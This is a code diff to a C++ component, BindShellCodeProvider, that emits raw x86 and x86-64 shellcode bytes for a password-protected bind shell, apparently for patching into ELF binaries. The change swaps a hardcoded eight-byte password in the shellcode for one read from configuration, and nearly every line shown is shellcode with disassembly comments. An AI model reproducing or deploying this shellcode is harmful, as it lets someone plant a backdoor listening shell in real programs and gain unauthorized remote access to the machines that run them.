@@ -8,6 +8,8 @@ void BindShellCodeProvider::getCode(uint64_t virtualAddress, std::vector<uint8_t
 	uint16_t port = Config::instance()->getBindShellPort();
 	uint8_t s1 = (port & 0xff00) >> 8;
 	uint8_t s2 = (port & 0xff);
+
+	std::string passwd = Config::instance()->getBindShellPasswd();
 	if (BinaryEditor::instance()->getPlatform() == ELF_CLASS::ELFCLASS64)
 	{
 		//完全位置无关
@@ -50,7 +52,8 @@ void BindShellCodeProvider::getCode(uint64_t virtualAddress, std::vector<uint8_t
 			0x6a, 0x08,//push	8
 			0x5a, //pop	rdx
 			0x0f, 0x05,//syscall sys_read
-			0x48, 0xb8,0x64,0x59,0x35,0x74,0x45,0x36,0x72,0x54,//movabs	rax, 0x5472364574355964
+			//0x48, 0xb8,0x64,0x59,0x35,0x74,0x45,0x36,0x72,0x54,//movabs	rax, 0x5472364574355964
+			0x48, 0xb8, passwd[0], passwd[1], passwd[2], passwd[3], passwd[4], passwd[5], passwd[6], passwd[7],
 			0x48, 0x39,0x4, 0x24,//cmp	qword ptr [rsp], rax
 			0x74, 0x01,//je	0x20
 			0xc3, //ret
@@ -122,13 +125,13 @@ void BindShellCodeProvider::getCode(uint64_t virtualAddress, std::vector<uint8_t
 			0x8d ,0x4c, 0x24 ,0xf8,//                          lea	ecx, dword ptr[esp - 8]
 			0xb2 ,0x08,//                              mov	dl, 8
 			0xcd ,0x80,//                              int	0x80
-			0xb8 ,0x64 ,0x59 ,0x35 ,0x74,//                        mov	eax, 0x74355964
+			0xb8 ,passwd[0], passwd[1], passwd[2], passwd[3],//                        mov	eax, 0x74355964
 			0x39 ,0x44 ,0x24 ,0xf8,//                          cmp	dword ptr[esp - 8], eax
 			0x74 ,0x01,//                              je	0x17
 			//0x16
 			0xc3,//                                ret
 			//0x17
-			0xb8 ,0x45 ,0x36 ,0x72 ,0x54,//                        mov	eax, 0x54723645
+			0xb8 ,passwd[4], passwd[5], passwd[6], passwd[7],//                        mov	eax, 0x54723645
 			0x39 ,0x44 ,0x24 ,0xfc,//                          cmp	dword ptr[esp - 4], eax
 			0x75 ,0xf4,//                              jne	0x16
 			0x5b, //pop ebx恢复fd
